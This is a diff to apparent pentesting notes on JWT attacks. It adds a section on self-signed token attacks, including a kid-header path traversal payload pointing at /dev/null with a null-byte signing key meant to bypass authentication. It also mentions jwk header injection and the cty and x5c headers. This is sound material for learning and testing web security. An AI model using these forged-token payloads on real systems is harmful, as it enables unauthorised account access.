@@ -21,6 +21,11 @@ Time taken (sec): 0.123
 Total attempts: 20000
 ```
 
+#### Self-signed JWT attacks
+
+---
+
+
 4. `jwk header injection` - Change the required paramter then create a new RSA key, use JWT editor, embed the jwk with your newly created RSA key and send the request.
 
 ```json
@@ -66,4 +71,22 @@ Total attempts: 20000
 }
 ```
 
-6. 
+6. `kid header path traversal` - If the kid parameter is vulnerable to path traversal, we can sign our jwt with an empty string like `../../../../../../dev/null` or any other predictable file in a filesystem. Thus, since jwt key is signed with a null string, we can bypass the auth.
+
+```py
+{
+    "kid": "../../../../../../../dev/null",
+    "alg": "HS256"
+}
+
+Signing key : {
+    "kty": "oct",
+    "kid": "14f35b95-59a6-4a25-a1fd-61bf8c84e166",
+    "k": "AA=="
+}
+```
+
+---
+
+`cty` and `x5c` are few other vuln headers which can be exploited.
+
